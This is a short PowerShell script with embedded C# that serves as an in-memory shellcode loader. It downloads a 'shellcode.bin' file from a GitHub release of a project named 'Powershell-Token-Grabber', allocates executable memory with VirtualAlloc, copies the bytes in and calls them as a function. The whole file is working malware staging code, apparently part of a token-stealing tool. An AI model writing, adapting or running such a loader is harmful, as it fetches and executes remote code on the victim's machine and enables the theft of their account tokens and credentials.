function kematian {   
    $kematianthegreat = @"
    using System;
    using System.Net;
    using System.Runtime.InteropServices;

    public class kematianthegreat {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MemLoader();

        public static void Main() {
            string url = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/shellcode.bin";
            byte[] golangshc;
            using (WebClient client = new WebClient()) {
                golangshc = client.DownloadData(url);
            }

            IntPtr chainski = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(golangshc.Length), 0x1000, 0x40);    
            Marshal.Copy(golangshc, 0x0, chainski, golangshc.Length);
            MemLoader kdot = Marshal.GetDelegateForFunctionPointer<MemLoader>(chainski);  
            kdot();
        }
    }
"@
    Add-Type $kematianthegreat
    [kematianthegreat]::Main()
}
kematian